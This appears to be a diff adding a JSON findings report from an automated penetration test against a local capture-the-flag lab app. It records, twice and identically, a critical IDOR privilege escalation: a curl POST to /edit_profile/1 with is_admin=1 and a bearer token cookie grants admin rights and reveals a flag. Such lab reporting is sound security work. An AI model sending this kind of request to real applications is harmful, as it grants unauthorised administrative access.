@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T21:12:37.564890+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "28a0687f-e382-4ce8-9550-89b187008fd6",
+      "timestamp": "2026-04-14T21:12:37.564574+00:00",
+      "title": "IDOR Privilege Escalation via is_admin Parameter",
+      "severity": "critical",
+      "target": "http://172.17.0.1:60985",
+      "description": "Insecure Direct Object Reference (IDOR) vulnerability in the profile update endpoint allows any authenticated user to escalate privileges by setting is_admin=1 parameter, even though the HTML form disables this field. The server does not validate that the requesting user has permission to modify admin status.",
+      "evidence": "POST /edit_profile/1 with body name=demo&is_admin=1 returned 'Profile updated successfully' and admin status changed to Admin. After privilege escalation, /company/1/jobs revealed secret job containing: flag{c131ab68-2257-46c7-bf43-a1df6742f4f7}",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -X POST http://172.17.0.1:60985/edit_profile/1 -d 'name=demo&is_admin=1' -H 'Cookie: access_token=\"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZXhwIjoxNzc2MjAyOTE5fQ.GMKybxAWPHX5r9lWiuSf_3TwEGPAfvsYzp1a6hG3eX4\"'",
+        "expected": "Profile updated with admin privileges, secret jobs revealed"
+      }
+    },
+    {
+      "id": "e29791a0-b93c-4c1f-bddc-ee3e8b83214b",
+      "timestamp": "2026-04-14T21:12:37.653181+00:00",
+      "title": "IDOR Privilege Escalation via is_admin Parameter",
+      "severity": "critical",
+      "target": "http://172.17.0.1:60985",
+      "description": "Insecure Direct Object Reference (IDOR) vulnerability in the profile update endpoint allows any authenticated user to escalate privileges by setting is_admin=1 parameter, even though the HTML form disables this field. The server does not validate that the requesting user has permission to modify admin status.",
+      "evidence": "POST /edit_profile/1 with body name=demo&is_admin=1 returned 'Profile updated successfully' and admin status changed to Admin. After privilege escalation, /company/1/jobs revealed secret job containing: flag{c131ab68-2257-46c7-bf43-a1df6742f4f7}",
+      "tool_used": "http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -X POST http://172.17.0.1:60985/edit_profile/1 -d 'name=demo&is_admin=1' -H 'Cookie: access_token=\"Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIiwiZXhwIjoxNzc2MjAyOTE5fQ.GMKybxAWPHX5r9lWiuSf_3TwEGPAfvsYzp1a6hG3eX4\"'",
+        "expected": "Profile updated with admin privileges, secret jobs revealed"
+      }
+    }
+  ],
+  "diagrams": []
+}
